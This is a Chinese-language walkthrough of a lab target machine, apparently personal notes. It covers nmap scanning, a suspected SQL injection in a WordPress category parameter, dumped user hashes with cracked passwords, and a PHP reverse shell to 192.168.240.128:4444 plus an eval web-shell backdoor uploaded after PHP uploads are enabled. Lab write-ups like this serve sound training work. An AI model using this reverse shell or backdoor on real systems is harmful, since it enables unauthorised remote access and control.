
# 靶机描述


# 渗透过程

## 初始侦察

### Nmap 主机发现

``nmap -sn 192.168.240.0/24``

192.168.240.137 为目标靶机
![[Pasted image 20250625100530.png]]

### Nmap TCP 端口扫描

![[Pasted image 20250625101209.png]]

### Nmap 详细信息扫描

![[Pasted image 20250625101329.png]]

### Nmap UDP扫描

![[Pasted image 20250625101409.png]]

## TCP 80端口 WEB渗透

访问主界面，查看源码，发现target是可点击跳转状态

![[Pasted image 20250625113508.png]]

跳转发现 no comments  及 uncategorized，亦是可跳转

![[Pasted image 20250625113614.png]]
uncategorized 点击后传参 ? cat=1 ,尝试改变参数，页面也随之改变，可能存在SQL注入

![[Pasted image 20250625113307.png]]

![[Pasted image 20250625113900.png]]


```
NickJames:21232f297a57a5a743894a0e4a801fc3

MaxBucky:50484c19f1afdaf3841a0d821ed393d2

GeorgeMiller:7cbb3252ba6b7e9c422fac5334d22054

JasonKonnors:8601f6e1028a8e8a966f6c33fcd9aec4

TonyBlack:a6e514f9486b83cb53d8d932f9a04292

JohnSmith:b986448f0bb9e5e124ca91d3d650f52c


User: TonyBlack      → Password: napoleon  
User: NickJames      → Password: admin  
User: GeorgeMiller   → Password: q1w2e3  
User: MaxBucky       → Password: kernel  
User: JasonKonnors   → Password: maxwell
```

### 已知路径下目录扫描

![[Pasted image 20250627110953.png]]

访问 readme.html ,发现wordpress框架版本等信息

![[Pasted image 20250627111149.png]]


![[Pasted image 20250701102805.png]]

将php类型添加到允许上传类型

上传反弹shell

```php
<?php
shell_exec("sh -i >& /dev/tcp/192.168.240.128/4444 0>&1");
@eval($_POST['a']);
?>
```

连接成功
![[Pasted image 20250701104506.png]]

